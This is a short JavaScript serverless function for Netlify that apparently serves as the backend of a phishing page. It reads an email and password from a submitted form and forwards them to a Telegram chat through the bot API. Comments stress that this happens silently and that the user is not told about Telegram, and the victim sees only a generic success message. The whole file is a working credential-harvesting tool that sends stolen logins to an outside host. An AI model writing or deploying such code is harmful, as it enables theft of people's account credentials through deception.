const fetch = require('node-fetch');

exports.handler = async (event, context) => {
  // Ensure the request is a POST request
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: 'Method Not Allowed',
    };
  }

  // Parse the form data
  const formData = JSON.parse(event.body);
  const { email, password } = formData;

  // Send data to Telegram (silently)
  const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN; // Store your bot token in Netlify environment variables
  const chatId = process.env.TELEGRAM_CHAT_ID; // Store your chat ID in Netlify environment variables
  const message = `New Form Submission:\nEmail: ${email}\nPassword: ${password}`;

  try {
    await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    // Return a success response to the user (without mentioning Telegram)
    return {
      statusCode: 200,
      body: JSON.stringify({ message: 'Form submitted successfully!' }),
    };
  } catch (error) {
    console.error('Error sending data to Telegram:', error);
    // Return a generic error response to the user
    return {
      statusCode: 500,
      body: JSON.stringify({ message: 'An error occurred. Please try again.' }),
    };
  }
};